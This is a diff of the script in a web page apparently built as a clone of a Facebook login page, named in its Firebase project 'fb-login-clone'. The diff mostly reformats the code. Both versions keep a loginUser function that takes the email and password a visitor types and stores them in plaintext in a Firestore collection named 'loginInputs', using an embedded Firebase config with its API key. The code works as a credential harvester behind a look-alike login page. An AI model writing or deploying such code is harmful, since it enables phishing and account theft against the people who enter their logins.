@@ -95,48 +95,49 @@
   </div>
 
 <script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
-  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";
 
-  // Firebase config
-  const firebaseConfig = {
-    apiKey: "AIzaSyB9KWblpo3INqABlAK1zTYbbuzRkUYZ8TM",
-    authDomain: "fb-login-clone-fb034.firebaseapp.com",
-    projectId: "fb-login-clone-fb034",
-    storageBucket: "fb-login-clone-fb034.firebasestorage.app",
-    messagingSenderId: "1087507018736",
-    appId: "1:1087507018736:web:8d7b04b3dd0b4a89726335"
-  };
+// 🔹 Firebase configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyB9KWblpo3INqABlAK1zTYbbuzRkUYZ8TM",
+  authDomain: "fb-login-clone-fb034.firebaseapp.com",
+  projectId: "fb-login-clone-fb034",
+  storageBucket: "fb-login-clone-fb034.firebasestorage.app",
+  messagingSenderId: "1087507018736",
+  appId: "1:1087507018736:web:8d7b04b3dd0b4a89726335"
+};
 
-  const app = initializeApp(firebaseConfig);
-  const db = getFirestore(app);
+// 🔹 Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
 
-  // Login function: save email + password to Firestore
-  window.loginUser = async function() {
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value;
+// 🔹 Login function: save input to Firestore
+window.loginUser = async function() {
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value;
 
-    if (!email || !password) {
-      alert("Please fill in both email and password!");
-      return;
-    }
+  if (!email || !password) {
+    alert("Please fill in both email and password!");
+    return;
+  }
 
-    try {
-      await addDoc(collection(db, "loginInputs"), {
-        email: email,
-        password: password,
-        timestamp: new Date()
-      });
-      alert("Login inputs saved to database!");
-    } catch (error) {
-      alert("Error: " + error.message);
-    }
-  };
+  try {
+    await addDoc(collection(db, "loginInputs"), {
+      email: email,
+      password: password,
+      timestamp: new Date()
+    });
+    alert("Login inputs saved to database!");
+  } catch (error) {
+    alert("Error: " + error.message);
+  }
+};
 
-  // Signup placeholder (optional)
-  window.signupUser = function() {
-    alert("Signup button clicked (you can implement if needed).");
-  };
+// 🔹 Signup placeholder
+window.signupUser = function() {
+  alert("Signup button clicked (optional, not saving to DB).");
+};
 </script>
 
 </body>
